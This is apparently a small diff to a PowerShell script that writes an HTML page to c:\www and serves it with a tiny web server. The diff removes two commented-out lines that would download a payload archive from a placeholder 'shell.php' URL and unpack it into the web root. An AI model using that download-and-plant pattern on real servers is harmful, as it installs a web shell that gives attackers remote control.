@@ -37,7 +37,4 @@ $html_code=@"
 </html>
 "@
 Set-Content -Path c:\www\index.html -Value $html_code
-tiny c:\www
-
-# Invoke-WebRequest -Uri "<shell.php URL>" -Outfile "C:\www\payload.zip"
-# Expand-Archive -Path C:\www\payload.zip -DestinationPath C:\www -Force
+c:\www\tiny c:\www
